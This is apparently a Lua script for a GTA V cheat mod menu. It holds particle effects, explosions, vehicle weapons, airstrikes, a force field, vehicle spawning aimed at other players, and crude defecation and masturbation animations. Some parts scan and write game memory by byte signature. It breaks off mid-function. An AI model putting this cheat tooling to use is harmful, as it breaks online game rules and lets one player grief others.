function request_fx_asset(asset)
	STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
	while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		wait()
	end
end

Colour.new = function(R, G, B, A)
    return {r = R or 0, g = G or 0, b = B or 0, a = A or 0}
end

function personllight()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end

function personllighta()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_svm_technical2", "scr_dst_cocaine")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end

function personllightb()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("veh_xs_vehicle_mods", "exp_xs_mine_emp")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -1,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end

function personllightc()
    local localPed = PLAYER.PLAYER_PED_ID()
    local effect = Effect.new("scr_xs_props", "scr_xs_exp_mine_sf")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -1,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end

function supermanpersonl()
	local pWeapon = memory.alloc_int()
	WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
	local weaponHash = memory.read_int(pWeapon)
	if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
		local pImpactCoords = v3.new()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
			set_explosion_proof(players.user_ped(), true)
			wait()
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
		elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
			set_explosion_proof(players.user_ped(), false)
		end
	end
end

function becomepoliceman()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
    PED.SET_PED_AS_COP(p, true)
    menu.trigger_commands("smycop01") --model cop
    menu.trigger_commands("police3") --spawn cop car
end


local agroup = "missfbi3ig_0"
local mshit = util.joaat("prop_big_shit_02")
local agroup2 = "switch@trevor@jerking_off"
local cum = util.joaat("p_oil_slick_01")
local anim2 = "trev_jerking_off_loop"
local anim = "shit_loop_trev"
local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
local ufo = util.joaat("sum_prop_dufocore_01a")
local num = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35"
}
local c1
local c2
local c3
local c4
local c5
local c6
local c7
local c8
local c9
local c10
local c12
local c13
local c14
local c15
local c16
local c17
local c18
local c19

function personlshit() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        wait()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true) --play anim
    wait(1000)
    local shit = entities.create_object(mshit, c) --spawn shit
    wait(60000)
    entities.delete_by_handle(shit) --delete shit
end

function personlhitplane() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup2) do
        STREAMING.REQUEST_ANIM_DICT(agroup2)
        wait()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup2, anim2, 8.0, 8.0, 5000, 1, 0, true, true, true) --play anim
    wait(4500)
    local cum = entities.create_object(cum, c) --spawn cum
    wait(60000)
    entities.delete_by_handle(cum) --delete cum
end

local selectedOpt = 1
options_force  = {"推开", "摧毁"}
function forcefielddd()
    if selectedOpt == 1 then
		local entities = get_entities_in_player_range(players.user(), 10.0)
		local playerPos = players.get_position(players.user())
		for _, entity in ipairs(entities) do
			local entPos = ENTITY.GET_ENTITY_COORDS(entity, false)

			if not (ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_A_PLAYER(entity)) and
			PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= entity and request_control_once(entity) then
				local force = v3.new(entPos)
				force:sub(playerPos)
				force:normalise()
				if ENTITY.IS_ENTITY_A_PED(entity) then PED.SET_PED_TO_RAGDOLL(entity, 1000, 1000, 0, false, false, false) end
				ENTITY.APPLY_FORCE_TO_ENTITY(entity, 3, force.x,force.y,force.z, 0, 0, 0.5, 0, false, false, true, false, false)
			end
		end
	elseif selectedOpt == 2 then
		set_explosion_proof(players.user_ped(), true)
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 29, 5.0, false, true, 0.0, true)
	end
end

function forcefield_set(index)
    selectedOpt = index
end

state = 0
local notif_format = "按 左键 和 右键 来使用原力"
function jedmode()
    if state == 0 then
		notification(notif_format, HudColour.blue, "INPUT_ATTACK", "INPUT_AIM")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name, players.user_ped(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false
		)
		state = 1
	elseif state == 1 then
		PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
		PAD.DISABLE_CONTROL_ACTION(0, 25, true)
		PAD.DISABLE_CONTROL_ACTION(0, 68, true)
		PAD.DISABLE_CONTROL_ACTION(0, 91, true)
		local entities = get_ped_nearby_vehicles(players.user_ped())

		for _, vehicle in ipairs(entities) do
			if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and
			PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) == vehicle then
				continue
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)

			elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
			end
		end
	end
end

object = 0
local format0 = "按 ~%s~ ~%s~ ~%s~ ~%s~ 来使用地毯式骑行"
local format1 = "按 ~%s~ 以移动得更快"
function carpetridexx()
    if state == 0 then
		local objHash = util.joaat("p_cs_beachtowel_01_s")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			wait()
		end
		local localPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(
			localPed, object, 0, 0, -0.2, 1.0, 1.0, 1.0,1, false, true, false, false, 0, true, false
		)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)

		TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        notification(format0 .. ".\n" .. format1 .. '.', HudColour.black,
        "INPUT_MOVE_UP_ONLY", "INPUT_MOVE_DOWN_ONLY", "INPUT_VEH_JUMP", "INPUT_DUCK", "INPUT_VEH_MOVE_UP_ONLY")
		state = 1

	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if PAD.IS_CONTROL_PRESSED(0, 61) then
			speed = 1.5
		end
		if PAD.IS_CONTROL_PRESSED(0, 32) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if PAD.IS_CONTROL_PRESSED(0, 130)  then
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
			delta.z = speed
		end
		if PAD.IS_CONTROL_PRESSED(0, 36) then
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x,newPos.y,newPos.z, false, false, false, false)
	end
end

function fingergun()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local projectile = util.joaat(weapon_name)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
            WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
            wait(10)
        end
        menu.toggle(finger_thing, name, {}, "", function(state)
            toggled = state
            while toggled do
                if memory.read_int(memory.script_global(4521801 + 930)) == 3 then
                    memory.write_int(memory.script_global(4521801 + 935), NETWORK.GET_NETWORK_TIME())
                    local inst = v3.new()
                    v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                    local tmp = v3.toDir(inst)
                    v3.set(inst, v3.get(tmp))
                    v3.mul(inst, 1000)
                    v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                    v3.add(inst, tmp)
                    local x, y, z = v3.get(inst)
                    local fingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xff9, 1.0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y, z, 1, true, projectile, 0, true, false, 500.0, players.user_ped(), 0)
                end
                wait(100)
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end

function bigpussy()
    if state == 0 then
		local objHash <const> = util.joaat("apa_mp_apa_y1_l1a")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			wait()
		end
		local localPed = PLAYER.PLAYER_PED_ID()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(localPed, object, 0, 0, 4, 1.0, 0, 0, 0, false, true, false, false, 0, true)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)	
		state = 1
	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, camrot.x, camrot.y, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2

		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x, newPos.y, newPos.z, false, false, false, false)
	end
end

------------------------------------
-------------视觉效果---------------
------------------------------------

function drunkmode(val)
    if val > 0 then
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", val)
        GRAPHICS.SET_TIMECYCLE_MODIFIER("Drunk")
    else
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 0)
    end
end

function visual_setting()
    local visions = menu.list(visuals, "屏幕效果", {""}, "")
for id, data in pairs(effect_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    menu.toggle(visions, effect_name, {"screenvisual"}, "", function(toggled)
        if toggled then
            GRAPHICS.ANIMPOSTFX_PLAY(effect_thing, 5, true)
        else
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
        end
    end)
end

local visual_fidelity = menu.list(visuals, "视觉增强", {}, "")
for id, data in pairs(visual_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end


local drug_mode = menu.list(visuals, "药物过滤器", {}, "")
for id, data in pairs(drugged_effects) do
    menu.toggle(drug_mode, data, {}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(data)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end
end


------------------------------------
-------------载具选项---------------
------------------------------------
local get_vehicle_cam_relative_heading = function(vehicle)
	local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
	local fwdVector = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
	camDir.z, fwdVector.z = 0.0, 0.0
	local angle = math.acos(fwdVector:dot(camDir) / (#camDir * #fwdVector))
	return math.deg(angle)
end

local shoot_from_vehicle = function (vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
	local min, max = v3.new(), v3.new()
	local offset
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
	if position == 0 then
		offset = v3.new(min.x, max.y + 0.25, 0.3)
	elseif position == 1 then
		offset = v3.new(min.x, min.y, 0.3)
	elseif position == 2 then
		offset = v3.new(max.x, max.y + 0.25, 0.3)
	elseif position == 3 then
		offset = v3.new(max.x, min.y, 0.3)
	else
		error("得到了意想不到的位置")
	end
	local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y, offset.z)
	local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
	if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
		direction:mul(-1)
	end
	local b = v3.new(direction)
	b:mul(300.0); b:add(a)

	MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
		a.x, a.y, a.z,
		b.x, b.y, b.z,
		damage,
		true,
		weaponHash,
		ownerPed,
		isAudible,
		not isVisible,
		speed,
		vehicle,
		false, false, target, false, 0, 0, 0
	)
end

function vehlaser()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		local vehicle = get_vehicle_player_is_in(players.user())
		local min, max = v3.new(), v3.new()
		MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
		local startLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle,  min.x, max.y, 0.0)
		local endLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, min.x, max.y + 25.0, 0.0)
		GRAPHICS.DRAW_LINE(startLeft.x, startLeft.y, startLeft.z, endLeft.x, endLeft.y, endLeft.z, 255, 0, 0, 150)

		local startRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y, 0.0)
		local endRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y + 25.0, 0)
		GRAPHICS.DRAW_LINE(startRight.x, startRight.y, startRight.z, endRight.x, endRight.y, endRight.z, 255, 0, 0, 150)
	end
end

VehicleWeapon = {modelName = "", timeBetweenShots = 0}
VehicleWeapon.__index = VehicleWeapon

function VehicleWeapon.new(modelName, timeBetweenShots)
	local instance = setmetatable({}, VehicleWeapon)
	instance.modelName = modelName
	instance.timeBetweenShots = timeBetweenShots
	return instance
end

--[[translations = {}
setmetatable(translations, {
    __index = function (self, key)
        return key
    end
})]]
G = GTluaScript.attach_before(GTluaScript.ref_by_path('Stand>Settings'),GTluaScript.list(GTluaScript.shadow_root(), 'GRANDTOURINGVIP', {"GTLuaScript"}, 'GRANDTOURINGVIP YYDS ! ! !', 
function()end))
GTluaScript.trigger_commands("GTLuaScript")
--[[local loading_frames = {'', 'G', 'GR', 'GRA', 'GRAN', 'GRAND', 'GRANDT', 'GRANDTO', 'GRANDTOU', 'GRANDTOUR', 'GRANDTOURI', 'GRANDTOURIN', 'GRANDTOURIN', 'GRANDTOURING', 'GRANDTOURINGV', 'GRANDTOURINGVI', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP', 'GRANDTOURING', 'GRAND', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP'}
util.create_tick_handler(function()
    for _, frame in pairs(loading_frames) do
        GTluaScript.set_menu_name(G, frame .. '')
        wait(100)
    end
end)]]

local vehicleWeaponList <const> = {
	VehicleWeapon.new("weapon_vehicle_rocket", 220),
	VehicleWeapon.new("weapon_raypistol", 50),
	VehicleWeapon.new("weapon_firework", 220),
	VehicleWeapon.new("vehicle_weapon_tank", 220),
	VehicleWeapon.new("vehicle_weapon_player_lazer", 30)
}

state = 0
local timer <const> = newTimer()
local msg = "按 ~%s~ 使用载具武器"

function vehweapon_veh()
    local control = Config.controls.vehicleweapons
	if state == 0 or timer.elapsed() > 120000 then
		local controlName = table.find_if(Imputs_vehweapon, function(k, tbl)
			return tbl[2] == control
		end)
		assert(controlName, "未找到控件名称")
		util.show_corner_help(msg:format(controlName))
		state = 1
		timer.reset()
	end

	local selectedWeapon = vehicleWeaponList[selectedOpt]
	local vehicle = get_vehicle_player_is_in(players.user())
	local weaponHash <const> = util.joaat(selectedWeapon.modelName)
	request_weapon_asset(weaponHash)

	if not ENTITY.DOES_ENTITY_EXIST(vehicle) or not PAD.IS_CONTROL_PRESSED(0, control) or
	timer.elapsed() < selectedWeapon.timeBetweenShots then
		return
	elseif get_vehicle_cam_relative_heading(vehicle) < 95.0 then
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 0)
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 2)
		timer.reset()
	else
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 1)
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 3)
		timer.reset()
	end
end

function setvehweapon(index)
    selectedOpt = index 
end

state = 0
local hash_plane = util.joaat("weapon_airstrike_rocket")
local trans =
{
	MenuName = "空袭飞机",
	Help = "使用任何飞机或直升机进行空袭",
	CornerHelp = "按 ~%s~ 以使用空袭飞机",
	Notification = "空袭飞机可用于飞机和直升机",
	HelpText = "空袭飞机可用于飞机和直升机",
}

function airstrikeaicraft_plane()
local control = Config.controls.airstrikeaircraft
if state == 0 then
    local action_name = table.find_if(Imputs_vehweapon, function (k, tbl)
        return tbl[2] == control
    end)
    assert(action_name, "control name not found")
    notification("空袭飞机可用于飞机和直升机")
    util.show_corner_help(trans.CornerHelp:format(action_name))
    state = 1
end

if PED.IS_PED_IN_FLYING_VEHICLE(players.user_ped()) and PAD.IS_CONTROL_PRESSED(2, control) and
timer.elapsed() > 800 then
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
    local groundZ = get_ground_z(vehPos)
    local startTime = newTimer()

    util.create_tick_handler(function()
        wait(500)
        if vehPos.z - groundZ < 10.0 then
            return false
        end
        local pos = get_random_offset_in_range(vehPos, 0.0, 5.0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            pos.x, pos.y, pos.z - 3.0,
            pos.x, pos.y, groundZ,
            200,
            true,
            hash_plane,
            players.user_ped(), true, false, 1000.0
        )
        return startTime.elapsed() < 5000
    end)

    timer.reset()
    end
end

local NULL <const> = 0
subHandlingClasses =
{
	[0]  = "CBikeHandlingData",
	[1]  = "CFlyingHandlingData",
	[2]  = "CFlyingHandlingData2",
	[3]  = "CBoatHandlingData",
	[4]  = "CSeaPlaneHandlingData",
	[5]  = "CSubmarineHandlingData",
	[6]  = "CTrainHandlingData",
	[7]  = "CTrailerHandlingData",
	[8]  = "CCarHandlingData",
	[9]  = "CVehicleWeaponHandlingData",
	[10] = "CSpecialFlightHandlingData",
}

function get_sub_handling_type(subHandling)
	local funAddress = memory.read_long(memory.read_long(subHandling) + 16)
	return util.call_foreign_function(funAddress, subHandling)
end


function get_sub_handling_array(handlingData)
	local subHandlingArray = memory.read_long(handlingData + 0x158)
	local numSubHandling = memory.read_ushort(handlingData + 0x160)
	local arr = {}
	local index = 0
	local t = -1

	while true do
		local subHandling = memory.read_long(subHandlingArray + index * 8)
		if subHandling == NULL then
			goto NotFound
		end

		t = get_sub_handling_type(subHandling)
		if t >= 0 and t <= 10 then
			table.insert(arr, {type = t, address = subHandling})
		end

	::NotFound::
		index = index + 1
		if index >= numSubHandling then break end
	end

	return arr
end

local GetVehicleModelInfo = 0
---@diagnostic disable-next-line: undefined-global
memory_scan("GVMI", "48 89 5C 24 ? 57 48 83 EC 20 8B 8A ? ? ? ? 48 8B DA", function (address)
	GetVehicleModelInfo = memory.rip(address + 0x2A)
end)


local GetHandlingDataFromIndex = 0
---@diagnostic disable-next-line: undefined-global
memory_scan("GHDFI", "40 53 48 83 EC 30 48 8D 54 24 ? 0F 29 74 24 ?", function (address)
	GetHandlingDataFromIndex = memory.rip(address + 0x37)
end)

valiases_spawn = {}
function veh_spawn_see()
    local current_preview = nil
    local next_preview
    local image_preview
    local function rotation_to_direction(rotation)
        local adjusted_rotation =
        {
            x = (math.pi / 180) * rotation.x,
            y = (math.pi / 180) * rotation.y,
            z = (math.pi / 180) * rotation.z
        }
        local direction =
        {
            x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
            y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
            z =  math.sin(adjusted_rotation.x)
        }
        return direction
    end
    local function get_offset_from_camera(distance)
        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
        local cam_pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
        local direction = rotation_to_direction(cam_rot)
        local destination =
        {
            x = cam_pos.x + direction.x * distance,
            y = cam_pos.y + direction.y * distance,
            z = cam_pos.z + direction.z * distance
        }
        return destination
    end

    local function update_preview_tick()
        if current_preview ~= nil then
            current_preview.position = get_offset_from_camera(current_preview.camera_distance)
            current_preview.rotation.z = current_preview.rotation.z + 2
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(
                    current_preview.handle,
                    current_preview.position.x,
                    current_preview.position.y,
                    current_preview.position.z,
                    true, false, false
            )
            ENTITY.SET_ENTITY_ROTATION(
                    current_preview.handle,
                    current_preview.rotation.x,
                    current_preview.rotation.y,
                    current_preview.rotation.z,
                    2, true
            )
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(current_preview.handle, false, true)
            ENTITY.SET_ENTITY_ALPHA(current_preview.handle, 206, false)
            ENTITY.FREEZE_ENTITY_POSITION(current_preview.handle, true)
        end
    end

    
    for alias, vehicle in pairs(VEHICLE_ALIASES) do
        local alias_menu_item = menu.action(valiases_spawn.vehicle_aliases, alias, {alias}, "Spawn "..vehicle, function(click_type, pid)
                local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
                valiases_spawn.veh = util.joaat(vehicle)

                if valiases_spawn.vehicle_alias then
                    Vspawn(valiases_spawn.veh, tar1, targets, tostring(players.get_name(pid)))
                    else
                        if set.alert then
                            util.toast('未设置车辆生成')
                        end
                         
                end
        end, nil, nil, COMMANDPERM_SPAWN)

        menu.on_focus(alias_menu_item, function ()
            local hash = util.joaat(vehicle)
            Streament(hash)
            local handle = entities.create_vehicle(hash, {x=0, y=0, z=0}, 0)
            if handle then
                ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(handle , false, true)
                ENTITY.SET_ENTITY_ALPHA(handle , 206, false)
                ENTITY.FREEZE_ENTITY_POSITION(handle, true)
                current_preview = {
                    handle = handle,
                    position={x=0,y=0,z=0},
                    rotation={x=0,y=0,z=0},
                    camera_distance=5}
            end
        end)
        menu.on_blur(alias_menu_item, function()
          entities.delete_by_handle(current_preview.handle)
          current_preview = nil
        end)
      end
      util.create_tick_handler(function ()
        if current_preview ~= nil then
          update_preview_tick()
        end
    end)
end

function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
